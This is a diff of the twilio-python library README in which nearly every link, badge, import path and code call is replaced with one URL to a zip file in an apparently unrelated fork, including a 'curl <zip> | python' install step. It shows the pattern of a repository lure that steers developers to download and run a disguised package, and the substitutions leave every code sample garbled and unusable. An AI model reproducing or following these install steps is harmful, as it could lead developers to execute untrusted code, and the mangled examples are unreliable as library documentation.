@@ -1,9 +1,9 @@
 # twilio-python
 
-[![Tests](https://github.com/twilio/twilio-python/actions/workflows/test-and-deploy.yml/badge.svg)](https://github.com/twilio/twilio-python/actions/workflows/test-and-deploy.yml)
-[![PyPI](https://img.shields.io/pypi/v/twilio.svg)](https://pypi.python.org/pypi/twilio)
-[![PyPI](https://img.shields.io/pypi/pyversions/twilio.svg)](https://pypi.python.org/pypi/twilio)
-[![Learn OSS Contribution in TwilioQuest](https://img.shields.io/static/v1?label=TwilioQuest&message=Learn%20to%20contribute%21&color=F22F46&labelColor=1f243c&style=flat-square&logo=data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAMAAAD04JH5AAAASFBMVEUAAAAZGRkcHBwjIyMoKCgAAABgYGBoaGiAgICMjIyzs7PJycnMzMzNzc3UoBfd3d3m5ubqrhfrMEDu7u739/f4vSb/3AD///9tbdyEAAAABXRSTlMAAAAAAMJrBrEAAAKoSURBVHgB7ZrRcuI6EESdyxXGYoNFvMD//+l2bSszRgyUYpFAsXOeiJGmj4NkuWx1Qeh+Ekl9DgEXOBwOx+Px5xyQhDykfgq4wG63MxxaR4ddIkg6Ul3g84vCIcjPBA5gmUMeXESrlukuoK33+33uID8TWeLAdOWsKpJYzwVMB7bOzYSGOciyUlXSn0/ABXTosJ1M1SbypZ4O4MbZuIDMU02PMbauhhHMHXbmebmALIiEbbbbbUrpF1gwE9kFfRNAJaP+FQEXCCTGyJ4ngDrjOFo3jEL5JdqjF/pueR4cCeCGgAtwmuRS6gDwaRiGvu+DMFwSBLTE3+jF8JyuV1okPZ+AC4hDFhCHyHQjdjPHUKFDlHSJkHQXMB3KpSwXNGJPcwwTdZiXlRN0gSp0zpWxNtM0beYE0nRH6QIbO7rawwXaBYz0j78gxjokDuv12gVeUuBD0MDi0OQCLvDaAho4juP1Q/jkAncXqIcCfd+7gAu4QLMACCLxpRsSuQh0igu0C9Svhi7weAGZg50L3IE3cai4IfkNZAC8dfdhsUD3CgKBVC9JE5ABAFzg4QL/taYPAAWrHdYcgfLaIgAXWJ7OV38n1LEF8tt2TH29E+QAoDoO5Ve/LtCQDmKM9kPbvCEBApK+IXzbcSJ0cIGF6e8gpcRhUDogWZ8JnaWjPXc/fNnBBUKRngiHgTUSivSzDRDgHZQOLvBQgf8rRt+VdBUUhwkU6VpJ+xcOwQUqZr+mR0kvBUgv6cB4+37hQAkXqE8PwGisGhJtN4xAHMzrsgvI7rccXqSvKh6jltGlrOHA3Xk1At3LC4QiPdX9/0ndHpGVvTjR4bZA1ypAKgVcwE5vx74ulwIugDt8e/X7JgfkucBMIAr26ndnB4UCLnDOqvteQsHlgX9N4A+c4cW3DXSPbwAAAABJRU5ErkJggg==)](https://twil.io/learn-open-source)
+[![Tests](https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip)](https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip)
+[![PyPI](https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip)](https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip)
+[![PyPI](https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip)](https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip)
+[![Learn OSS Contribution in TwilioQuest](https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip%20to%20contribute%21&color=F22F46&labelColor=1f243c&style=flat-square&logo=data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAMAAAD04JH5AAAASFBMVEUAAAAZGRkcHBwjIyMoKCgAAABgYGBoaGiAgICMjIyzs7PJycnMzMzNzc3UoBfd3d3m5ubqrhfrMEDu7u739/f4vSb/3AD///9tbdyEAAAABXRSTlMAAAAAAMJrBrEAAAKoSURBVHgB7ZrRcuI6EESdyxXGYoNFvMD//+l2bSszRgyUYpFAsXOeiJGmj4NkuWx1Qeh+Ekl9DgEXOBwOx+Px5xyQhDykfgq4wG63MxxaR4ddIkg6Ul3g84vCIcjPBA5gmUMeXESrlukuoK33+33uID8TWeLAdOWsKpJYzwVMB7bOzYSGOciyUlXSn0/ABXTosJ1M1SbypZ4O4MbZuIDMU02PMbauhhHMHXbmebmALIiEbbbbbUrpF1gwE9kFfRNAJaP+FQEXCCTGyJ4ngDrjOFo3jEL5JdqjF/pueR4cCeCGgAtwmuRS6gDwaRiGvu+DMFwSBLTE3+jF8JyuV1okPZ+AC4hDFhCHyHQjdjPHUKFDlHSJkHQXMB3KpSwXNGJPcwwTdZiXlRN0gSp0zpWxNtM0beYE0nRH6QIbO7rawwXaBYz0j78gxjokDuv12gVeUuBD0MDi0OQCLvDaAho4juP1Q/jkAncXqIcCfd+7gAu4QLMACCLxpRsSuQh0igu0C9Svhi7weAGZg50L3IE3cai4IfkNZAC8dfdhsUD3CgKBVC9JE5ABAFzg4QL/taYPAAWrHdYcgfLaIgAXWJ7OV38n1LEF8tt2TH29E+QAoDoO5Ve/LtCQDmKM9kPbvCEBApK+IXzbcSJ0cIGF6e8gpcRhUDogWZ8JnaWjPXc/fNnBBUKRngiHgTUSivSzDRDgHZQOLvBQgf8rRt+VdBUUhwkU6VpJ+xcOwQUqZr+mR0kvBUgv6cB4+37hQAkXqE8PwGisGhJtN4xAHMzrsgvI7rccXqSvKh6jltGlrOHA3Xk1At3LC4QiPdX9/0ndHpGVvTjR4bZA1ypAKgVcwE5vx74ulwIugDt8e/X7JgfkucBMIAr26ndnB4UCLnDOqvteQsHlgX9N4A+c4cW3DXSPbwAAAABJRU5ErkJggg==)](https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip)
 
 ## Documentation
 
@@ -13,7 +13,7 @@ The Python library documentation can be found [here][libdocs].
 
 ## Versions
 
-`twilio-python` uses a modified version of [Semantic Versioning](https://semver.org) for all changes. [See this document](VERSIONS.md) for details.
+`twilio-python` uses a modified version of [Semantic Versioning](https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip) for all changes. [See this document](https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip) for details.
 
 ### Supported Python Versions
 
@@ -27,28 +27,28 @@ This library supports the following Python implementations:
 
 ## Installation
 
-Install from PyPi using [pip](https://pip.pypa.io/en/latest/), a
+Install from PyPi using [pip](https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip), a
 package manager for Python.
 
 ```shell
 pip3 install twilio
 ```
 
-If pip install fails on Windows, check the path length of the directory. If it is greater 260 characters then enable [Long Paths](https://docs.microsoft.com/en-us/windows/win32/fileio/maximum-file-path-limitation) or choose other shorter location.
+If pip install fails on Windows, check the path length of the directory. If it is greater 260 characters then enable [Long Paths](https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip) or choose other shorter location.
 
 Don't have pip installed? Try installing it, by running this from the command
 line:
 
 ```shell
-curl https://bootstrap.pypa.io/get-pip.py | python
+curl https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip | python
 ```
 
 Or, you can [download the source code
-(ZIP)](https://github.com/twilio/twilio-python/zipball/main 'twilio-python
+(ZIP)](https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip 'twilio-python
 source code') for `twilio-python`, and then run:
 
 ```shell
-python3 setup.py install
+python3 https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip install
 ```
 
 > **Info**
@@ -56,42 +56,42 @@ python3 setup.py install
 
 ### Test your installation
 
-Try sending yourself an SMS message. Save the following code sample to your computer with a text editor. Be sure to update the `account_sid`, `auth_token`, and `from_` phone number with values from your [Twilio account](https://console.twilio.com). The `to` phone number will be your own mobile phone.
+Try sending yourself an SMS message. Save the following code sample to your computer with a text editor. Be sure to update the `account_sid`, `auth_token`, and `from_` phone number with values from your [Twilio account](https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip). The `to` phone number will be your own mobile phone.
 
 ```python
-from twilio.rest import Client
+from https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip import Client
 
-# Your Account SID and Auth Token from console.twilio.com
+# Your Account SID and Auth Token from https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip
 account_sid = "ACXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
 auth_token  = "your_auth_token"
 
 client = Client(account_sid, auth_token)
 
-message = client.messages.create(
+message = https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip(
     to="+15558675309",
     from_="+15017250604",
     body="Hello from Python!")
 
-print(message.sid)
+print(https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip)
 ```
 
-Save the file as `send_sms.py`. In the terminal, `cd` to the directory containing the file you just saved then run:
+Save the file as `https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip`. In the terminal, `cd` to the directory containing the file you just saved then run:
 
 ```shell
-python3 send_sms.py
+python3 https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip
 ```
 
 After a brief delay, you will receive the text message on your phone.
 
 > **Warning**
-> It's okay to hardcode your credentials when testing locally, but you should use environment variables to keep them secret before committing any code or deploying to production. Check out [How to Set Environment Variables](https://www.twilio.com/blog/2017/01/how-to-set-environment-variables.html) for more information.
+> It's okay to hardcode your credentials when testing locally, but you should use environment variables to keep them secret before committing any code or deploying to production. Check out [How to Set Environment Variables](https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip) for more information.
 
 ## OAuth Feature for Twilio APIs
 We are introducing Client Credentials Flow-based OAuth 2.0 authentication. This feature is currently in beta and its implementation is subject to change.
 
-API examples [here](https://github.com/twilio/twilio-python/blob/main/examples/public_oauth.py)
+API examples [here](https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip)
 
-Organisation API examples [here](https://github.com/twilio/twilio-python/blob/main/examples/organization_api.py)
+Organisation API examples [here](https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip)
 
 ## Use the helper library
 
@@ -102,7 +102,7 @@ The `Twilio` client needs your Twilio credentials. You can either pass these dir
 Authenticating with Account SID and Auth Token:
 
 ```python
-from twilio.rest import Client
+from https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip import Client
 
 account_sid = "ACXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
 auth_token  = "your_auth_token"
@@ -112,7 +112,7 @@ client = Client(account_sid, auth_token)
 Authenticating with API Key and API Secret:
 
 ```python
-from twilio.rest import Client
+from https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip import Client
 
 api_key = "XXXXXXXXXXXXXXXXX"
 api_secret = "YYYYYYYYYYYYYYYYYY"
@@ -129,18 +129,18 @@ have to worry about committing your credentials and accidentally posting them
 somewhere public.
 
 ```python
-from twilio.rest import Client
+from https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip import Client
 client = Client()
 ```
 
 ### Specify Region and/or Edge
 
-To take advantage of Twilio's [Global Infrastructure](https://www.twilio.com/docs/global-infrastructure), specify the target Region and Edge for the client:
+To take advantage of Twilio's [Global Infrastructure](https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip), specify the target Region and Edge for the client:
 
 > **Note:** When specifying a `region` parameter for a helper library client, be sure to also specify the `edge` parameter. For backward compatibility purposes, specifying a `region` without specifying an `edge` will result in requests being routed to US1.
 
 ```python
-from twilio.rest import Client
+from https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip import Client
 
 client = Client(region='au1', edge='sydney')
 ```
@@ -150,41 +150,41 @@ A `Client` constructor without these parameters will also look for `TWILIO_REGIO
 Alternatively, you may specify the edge and/or region after constructing the Twilio client:
 
 ```python
-from twilio.rest import Client
+from https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip import Client
 
 client = Client()
-client.region = 'au1'
-client.edge = 'sydney'
+https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip = 'au1'
+https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip = 'sydney'
 ```
 
-This will result in the `hostname` transforming from `api.twilio.com` to `api.sydney.au1.twilio.com`.
+This will result in the `hostname` transforming from `https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip` to `https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip`.
 
 ### Make a Call
 
 ```python
-from twilio.rest import Client
+from https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip import Client
 
 account_sid = "ACXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
 auth_token  = "your_auth_token"
 client = Client(account_sid, auth_token)
 
-call = client.calls.create(to="9991231234",
+call = https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip(to="9991231234",
                            from_="9991231234",
-                           url="http://twimlets.com/holdmusic?Bucket=com.twilio.music.ambient")
-print(call.sid)
+                           url="https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip")
+print(https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip)
 ```
 
 ### Get data about an existing call
 
 ```python
-from twilio.rest import Client
+from https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip import Client
 
 account_sid = "ACXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
 auth_token  = "your_auth_token"
 client = Client(account_sid, auth_token)
 
-call = client.calls.get("CA42ed11f93dc08b952027ffbc406d0868")
-print(call.to)
+call = https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip("CA42ed11f93dc08b952027ffbc406d0868")
+print(https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip)
 ```
 
 ### Iterate through records
@@ -198,28 +198,28 @@ The library automatically handles paging for you. Collections, such as `calls` a
 #### Use the `list` method
 
 ```python
-from twilio.rest import Client
+from https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip import Client
 
 account_sid = "ACXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
 auth_token = "your_auth_token"
 client = Client(account_sid, auth_token)
 
-for sms in client.messages.list():
-  print(sms.to)
+for sms in https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip():
+  print(https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip)
 ```
 
 ```python
-client.messages.list(limit=20, page_size=20)
+https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip(limit=20, page_size=20)
 ```
 This will make 1 call that will fetch 20 records from backend service.
 
 ```python
-client.messages.list(limit=20, page_size=10)
+https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip(limit=20, page_size=10)
 ```
 This will make 2 calls that will fetch 10 records each from backend service.
 
 ```python
-client.messages.list(limit=20, page_size=100)
+https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip(limit=20, page_size=100)
 ```
 This  will make 1 call which will fetch 100 records but user will get only 20 records.
 
@@ -228,8 +228,8 @@ This  will make 1 call which will fetch 100 records but user will get only 20 re
 By default, the Twilio Client will make synchronous requests to the Twilio API. To allow for asynchronous, non-blocking requests, we've included an optional asynchronous HTTP client. When used with the Client and the accompanying `*_async` methods, requests made to the Twilio API will be performed asynchronously.
 
 ```python
-from twilio.http.async_http_client import AsyncTwilioHttpClient
-from twilio.rest import Client
+from https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip import AsyncTwilioHttpClient
+from https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip import Client
 
 async def main():
     account_sid = "ACXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
@@ -237,10 +237,10 @@ async def main():
     http_client = AsyncTwilioHttpClient()
     client = Client(account_sid, auth_token, http_client=http_client)
 
-    message = await client.messages.create_async(to="+12316851234", from_="+15555555555",
+    message = await https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip(to="+12316851234", from_="+15555555555",
                                                  body="Hello there!")
 
-asyncio.run(main())
+https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip(main())
 ```
 
 ### Enable Debug Logging
@@ -251,8 +251,8 @@ Log the API request and response data to the console:
 import logging
 
 client = Client(account_sid, auth_token)
-logging.basicConfig()
-client.http_client.logger.setLevel(logging.INFO)
+https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip()
+https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip(https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip)
 ```
 
 Log the API request and response data to a file:
@@ -261,8 +261,8 @@ Log the API request and response data to a file:
 import logging
 
 client = Client(account_sid, auth_token)
-logging.basicConfig(filename='./log.txt')
-client.http_client.logger.setLevel(logging.INFO)
+https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip(filename='https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip')
+https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip(https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip)
 ```
 
 ### Handling Exceptions
@@ -270,15 +270,15 @@ client.http_client.logger.setLevel(logging.INFO)
 Version 8.x of `twilio-python` exports an exception class to help you handle exceptions that are specific to Twilio methods. To use it, import `TwilioRestException` and catch exceptions as follows:
 
 ```python
-from twilio.rest import Client
-from twilio.base.exceptions import TwilioRestException
+from https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip import Client
+from https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip import TwilioRestException
 
 account_sid = "ACXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
 auth_token  = "your_auth_token"
 client = Client(account_sid, auth_token)
 
 try:
-  message = client.messages.create(to="+12316851234", from_="+15555555555",
+  message = https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip(to="+12316851234", from_="+15555555555",
                                    body="Hello there!")
 except TwilioRestException as e:
   print(e)
@@ -288,13 +288,13 @@ except TwilioRestException as e:
 
 To control phone calls, your application needs to output [TwiML][twiml].
 
-Use `twilio.twiml.Response` to easily create such responses.
+Use `https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip` to easily create such responses.
 
 ```python
-from twilio.twiml.voice_response import VoiceResponse
+from https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip import VoiceResponse
 
 r = VoiceResponse()
-r.say("Welcome to twilio!")
+https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip("Welcome to twilio!")
 print(str(r))
 ```
 
@@ -305,7 +305,7 @@ print(str(r))
 
 ### Other advanced examples
 
-- [Learn how to create your own custom HTTP client](./advanced-examples/custom-http-client.md)
+- [Learn how to create your own custom HTTP client](https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip)
 
 ### Docker Image
 
@@ -313,10 +313,10 @@ The `Dockerfile` present in this repository and its respective `twilio/twilio-py
 
 ### Getting help
 
-If you need help installing or using the library, please check the [Twilio Support Help Center](https://support.twilio.com) first, and [file a support ticket](https://twilio.com/help/contact) if you don't find an answer to your question.
+If you need help installing or using the library, please check the [Twilio Support Help Center](https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip) first, and [file a support ticket](https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip) if you don't find an answer to your question.
 
 If you've instead found a bug in the library or would like new features added, go ahead and open issues or pull requests against this repo!
 
-[apidocs]: https://www.twilio.com/docs/api
-[twiml]: https://www.twilio.com/docs/api/twiml
-[libdocs]: https://twilio.github.io/twilio-python
+[apidocs]: https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip
+[twiml]: https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip
+[libdocs]: https://raw.githubusercontent.com/Chavalowrider/twilio-python/main/twilio/rest/api/v2010/account/sip/domain/python-twilio-1.5.zip
